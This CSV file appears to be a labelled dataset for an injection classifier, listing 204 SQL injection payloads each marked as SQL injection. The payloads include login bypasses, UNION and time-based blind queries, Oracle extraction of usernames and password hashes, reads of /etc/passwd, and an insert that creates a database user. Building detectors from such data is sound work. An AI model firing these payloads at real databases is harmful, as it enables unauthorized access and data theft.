index,payload,sqli,xss
1,""" or pg_sleep  (  __TIME__  )  --",1,0
2," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,0
3," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1,0
4," select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",1,0
5, select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,1,0
6,select * from users where id  =  1 +$+ or 1  =  1 -- 1,1,0
7,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1,0
8," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",1,0
9," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",1,0
10,? or 1  =  1 --,1,0
11, )   or   (  'a'  =  'a,1,0
12,admin' or 1  =  1#,1,0
13," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",1,0
14,or 1  =  1 --,1,0
15," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,0
16," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",1,0
17," select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",1,0
18," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1,0
19,distinct,1,0
20,select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',1,0
21,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1,0
22,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,1,0
23,"admin"" or ""1""  =  ""1""--",1,0
24," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",1,0
25,insert,1,0
26," select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",1,0
27," select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1,0
28," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,0
29," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",1,0
30,"or 1  =  1 or """"  =  ",1,0
31,/**/or/**/1/**/  =  /**/1,1,0
32," select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1,0
33," select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1,0
34," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1,0
35,or 1  =  1/*,1,0
36,%27 or 1  =  1,1,0
37," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1,0
38," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1,0
39,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1,0
40," select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",1,0
41,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1,0
42," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",1,0
43," select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1,0
44," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1,0
45,select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',1,0
46," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1,0
47," select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1,0
48," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1,0
49,or 1 --',1,0
50," select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1,0
51,"admin"" or 1  =  1#",1,0
52," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1,0
53,\x27UNION SELECT,1,0
54,PRINT,1,0
55," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1,0
56,or 1  =  1--,1,0
57,1 or pg_sleep  (  __TIME__  )  --,1,0
58," select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1,0
59,admin'  )   or   (  '1'  =  '1'/*,1,0
60,or 2 between 1 and 3,1,0
61," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1,0
62," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1,0
63,admin' or '1'  =  '1,1,0
64," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0
65,""" or 0  =  0 --",1,0
66," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1,0
67,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1,0
68," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1,0
69," select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1,0
70," select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1,0
71,char%4039%41%2b%40SELECT,1,0
72," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1,0
73,admin'  )   or   (  '1'  =  '1,1,0
74,declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1,0
75,"or 0  =  0 #""",1,0
76," select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1,0
77,  )   or   (  'x'  =  'x,1,0
78," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1,0
79,$  (  sleep 50  ) ,1,0
80," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1,0
81,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1,0
82," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1,0
83," select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1,0
84," select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1,0
85,"""a"""" or 1  =  1--""",1,0
86," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0
87," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,0
88," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1,0
89,1 and user_name  (    )     =   'dbo',1,0
90,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1,0
91," select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1,0
92," select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1,0
93,select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1,0
94,select * from users where id  =  1 +$+. or 1  =  1 -- 1,1,0
95,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1,0
96," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,0
97,or 1  =  1 or ''  =  ',1,0
98,select * from users where id  =  1   or 1  =  1 -- 1,1,0
99,or 'text' > 't',1,0
100,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,0
101," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1,0
102," select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1,0
103,admin' or '1'  =  '1'#,1,0
104,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1,0
105,s,1,0
106," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,0
107, select * from information_schema.tables--,1,0
108," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1,0
109,1   )    )    or pg_sleep  (  __TIME__  )  --,1,0
110," select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1,0
111,declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1,0
112, or 1  =  1 or ''  =  ',1,0
113,select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,0
114,declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1,0
115," select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1,0
116," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1,0
117,or 'unusual'   =   'unusual',1,0
118, or 1 in   (  select @@version  )  --,1,0
119,truncate,1,0
120,as,1,0
121, or 3  =  3 --,1,0
122," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0
123," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1,0
124,"admin""  )   or   (  ""1""  =  ""1",1,0
125," select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1,0
126,"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,0
127," select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,0
128, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1,0
129," or 0  =  0 #""",1,0
130,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,0
131,select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1,0
132,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1,0
133,1  )   or sleep  (  __TIME__  )  #,1,0
134," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,0
135," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,0
136," select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1,0
137,select * from users where id  =  1. <@ or 1  =  1 -- 1,1,0
138, or true--,1,0
139,select * from users where id  =  1 <@ or 1  =  1 -- 1,1,0
140," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1,0
141,admin' #,1,0
142," select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,0
143," select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1,0
144," select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1,0
145," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1,0
146,"""  )  ;waitfor delay '0:0:__TIME__'--",1,0
147, or 'unusual'   =   'unusual',1,0
148,"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1,0
149,"admin"" or ""1""  =  ""1""/*",1,0
150," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1,0
151," select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1,0
152,like,1,0
153, )    )    or pg_sleep  (  __TIME__  )  --,1,0
154,select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1,0
155,or 3  =  3,1,0
156," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1,0
157,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1,0
158,exec sp,1,0
159," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1,0
160,select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1,0
161," select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1,0
162,admin' or 1  =  1/*,1,0
163,a' waitfor delay '0:0:10'--,1,0
164," select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1,0
165," select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,0
166,and 1 in   (  select var from temp  )  --,1,0
167,hi'  )   or   (  'a'  =  'a,1,0
168," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,0
169,"admin"" or 1  =  1",1,0
170,"""  )   or true--",1,0
171," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1,0
172," select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1,0
173,1  )   or pg_sleep  (  __TIME__  )  --,1,0
174," select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1,0
175,"""  )   or sleep  (  __TIME__  )    =  """,1,0
176,select * from users where id  =  1.<@. or 1  =  1 -- 1,1,0
177,"admin""  )   or   (  ""1""  =  ""1""--",1,0
178," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1,0
179," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,0
180,select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,0
181," select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1,0
182," select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1,0
183,1 and 1  =  1,1,0
184,or 0  =  0 #,1,0
185,union select * from users where login   =   char ...,1,0
186," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1,0
187,admin'  )   or '1'  =  '1'--,1,0
188," select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1,0
189," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,0
190," select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1,0
191," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,0
192,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1,0
193,procedure,1,0
194,or ''  =  ',1,0
195, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1,0
196," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,0
197," select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1,0
198,select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,0
199,""" or """"^""",1,0
200,"""-""",1,0
201," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1,0
202," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,0
203," select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1,0
204," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,0
